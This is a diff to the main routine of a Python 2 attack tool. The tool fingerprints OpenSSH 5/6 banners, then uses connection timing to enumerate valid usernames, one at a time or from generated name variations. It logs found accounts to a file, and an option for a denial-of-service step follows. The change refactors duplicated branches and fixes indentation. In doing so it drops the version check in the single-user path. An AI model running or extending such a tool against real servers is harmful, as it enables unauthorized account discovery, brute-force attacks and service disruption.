@@ -173,9 +173,9 @@ def main():
 					foundUser = []
 					print
 					banner = sshBanner(host,port)
-        				bannervuln = ['OpenSSH 5', 'OpenSSH 6']
-        				if banner[0:9] in bannervuln:
-                				print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
+					bannervuln = ['OpenSSH 5', 'OpenSSH 6']
+					if banner[0:9] in bannervuln:
+						print "[++] This version is perhaps vulnerable, we continue with the brutefroce attack ..."
 						print
 						print '======================================'
 						userNames = prepareUserNames(userFile,vari)            
@@ -201,83 +201,32 @@ def main():
 									if argus.outp != None:
 										fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 							print '======================================'
-        				else:
-                				print "[-] This version is not vulnerable."
-                				print "[-] Nothing to do."
+					else:
+							print "[-] This version is not vulnerable."
+							print "[-] Nothing to do."
 				else: 
-         
+					print
+					banner = sshBanner(host,port)
+					print
+					foundUser = []
+					user = argus.user
+					
 					if vari == 'yes':
-						print
-						banner = sshBanner(host,port)
-        					bannervuln = ['OpenSSH 5', 'OpenSSH 6']
-        					if banner[0:9] in bannervuln:
-                					print "This version is perhaps vulnerable, we continue with the brutefroce attack ..."
-							print
-							print '======================================'
-							foundUser = []
-							user = argus.user
-							userNames =  createUserNameVariationsFor(user)
- 							userNames = list(set(userNames))
-							for userName in userNames:
-								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-								fUser = sshTime(host,port,userName,sock,defTime)
-								if fUser != -1 and fUser !=None:
-									foundUser.append(fUser)
-								sock.close()
-							if len(foundUser) == 0:
-								print "No users found. " 
-								print '======================================'
-
-							else:	 
-								print
-								print "Server version: " + banner
-								print
-								print "Users found      Time delay in seconds"
-								print "--------------------------------------"
-								for entry in foundUser:
-									if entry != -1:
-										userfdos = entry[0]
-										print entry[0] + "                      " + str(entry[3])
-										if argus.outp != None:
-											fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds)'  + '\n')
-								print '======================================'
-        					else:
-                					print "[-] This version is not vulnerable."
-                					print "[-] Nothing to do."
-					if vari == 'no':
-						print
-						banner = sshBanner(host,port)
-        					bannervuln = ['OpenSSH 5', 'OpenSSH 6']
-        					if banner[0:9] in bannervuln:
-                					print "This version is perhaps vulnerable, we continue with the brutefroce attack ..."
-							print
-							print '======================================'
-							foundUser = []
-							user = argus.user
+						userNames =  createUserNameVariationsFor(user)
+						userNames = list(set(userNames))
+						for userName in userNames:
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-							fUser = sshTime(host,port,user,sock,defTime)
+							fUser = sshTime(host,port,userName,sock,defTime)
 							if fUser != -1 and fUser !=None:
 								foundUser.append(fUser)
 							sock.close()
-							if len(foundUser) == 0:
-								print "No user " + user + " found." 
-								print '======================================'
-							else:	 
-								print
-								print "Server version: " + banner
-								print
-								print "Users found      Time delay in seconds"
-								print "--------------------------------------"
-								for entry in foundUser:
-									if entry != -1:
-										userfdos = entry[0]
-										print entry[0] + "                      " + str(entry[3])
-										if argus.outp != None:
-											fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds)'  + '\n')
-							print '======================================'
-        					else:
-                					print "[-] This version is not vulnerable."
-                					print "[-] Nothing to do."
+					if vari == 'no':
+						sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+						fUser = sshTime(host,port,user,sock,defTime)
+						if fUser != -1 and fUser !=None:
+							foundUser.append(fUser)
+						sock.close()
+					print_success(foundUser, banner)
 				if dos == 'yes':
 					if userfdos != None:
 
